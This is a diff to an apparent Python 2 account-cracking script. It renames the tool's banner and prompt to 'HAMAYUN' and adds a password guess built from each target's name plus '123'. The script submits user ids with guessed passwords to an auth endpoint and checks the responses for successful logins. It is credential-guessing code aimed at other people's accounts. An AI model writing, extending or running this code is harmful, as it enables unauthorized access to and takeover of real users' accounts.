@@ -225,7 +225,7 @@ def menu():
 
 
 def menu_s():
-    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80SARFRAZ\xe2\x9e\xa4 ')
+    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80HAMAYUN\xe2\x9e\xa4 ')
     if ms == '1':
       
         name_crack()
@@ -272,13 +272,14 @@ def menu_s():
     print ' \x1b[1;97m~~~ Crack Running ~~~\x1b[1;91m'
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;94m{Rana Nadeem Rajput}\x1b[1;91m'
+    print '\t\x1b[1;94m{#HAMAYUN#\x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
         user = arg
         uid, name = user.split('|')
         try:
+            pass1=name+"123"
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
